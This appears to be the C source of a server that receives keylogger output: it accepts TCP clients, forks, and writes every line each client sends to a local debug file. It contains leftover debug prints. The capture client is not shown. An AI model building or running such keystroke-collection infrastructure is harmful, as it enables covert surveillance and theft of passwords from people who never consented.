#ifdef __STDC_ALLOC_LIB__
#define __STDC_WANT_LIB_EXT2__ 1
#else
#define _POSIX_C_SOURCE 200809L
#endif
#define _GNU_SOURCE

#include "server.h"

#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include "server_utils.h"

keylog_server* make_keylog_server(struct sockaddr_in ip_addr, int max_backlog) {
  keylog_server* server = malloc(sizeof(keylog_server));
  server->listener = open_tcp_socket();
  server->addr = ip_addr;
  server->max_backlog = max_backlog;
  return server;
}

void free_keylog_server(keylog_server* server) {
  close_tcp_socket(server->listener);
  free(server);
}

void listen_for_connections(keylog_server* server) {
  if (bind(server->listener, (struct sockaddr*)&server->addr,
           sizeof(server->addr)) == -1) {
    error_and_exit("CANNOT BIND");
  }
  if (listen(server->listener, server->max_backlog) == -1) {
    error_and_exit("CANNOT LISTEN");
  }
}

int accept_client(keylog_server* server) {
  // LISTENING
  struct sockaddr_in client;
  unsigned int address_size = sizeof(server->addr);
  int client_fd = accept4(server->listener, (struct sockaddr*)&client,
                          &address_size, SOCK_CLOEXEC);
  if (client_fd == -1) {
    error_and_exit("COULDN'T ACCEPT");
  }

  // Fork a new process
  pid_t pid = fork();
  if (pid == -1) {
    error_and_exit("COULDN'T FORK");
  }

  if (pid == 0) {
    // echo(client_fd);
    puts("HERE WE GO");
    process_keylog_info(client_fd);
    puts("HERE WE GO 2");

    close(client_fd);
    return -1;
  } else {
    close(client_fd);
    return 0;
  }
}

void process_keylog_info(int socket_descriptor) {
  FILE* client_file = fdopen(socket_descriptor, "r+");
  if (client_file == NULL) {
    error_and_exit("Couldn't open file");
  }
  char* line = NULL;
  size_t line_size = 0;
  FILE* debug = fopen("debug.txt", "a+");
  if (debug == NULL) {
    error_and_exit("Couldn't open file");
  }
  // WHILE WE HAVEN'T CLOSED THE CLIENT
  while (!feof(client_file)) {
    puts("NOW HERE");
    // GET THE LINE FROM THE CLIENT FILE
    ssize_t debugger = getline(&line, &line_size, client_file);
    puts("HERE WE GO 3");
    if (debugger == -1) {
      puts("BROKEN");
      error_and_exit("XD");
    }
    puts("smile :)");
    // PRINT THE LINE TO A TEXT FILE

    fprintf(debug, "%s", line);

    // FREE THE LINE
    free(line);
    line = NULL;
    puts("Test3");
  }
  // CLOSE THE TEXT FILE WE'RE WRITING TO
  fclose(debug);
  // CLOSE THE CLIENT
  if (fclose(client_file) == EOF) {
    error_and_exit("Couldn't close client socket descriptor");
  }
}

// void echo(int socket_descriptor) {
//   char s[1000];
//   while (1) {
//     ssize_t got_message = recv(socket_descriptor, s, sizeof(s), 0);
//     if (got_message == -1) {
//       error_and_exit("Couldn't receive.");
//     }
//     if (got_message == 0) {
//       break;
//     }
//     ssize_t sent_message = send(socket_descriptor, s, (size_t)got_message,
//     0); if (sent_message == -1) {
//       error_and_exit("Couldn't send");
//     }
//   }
// }
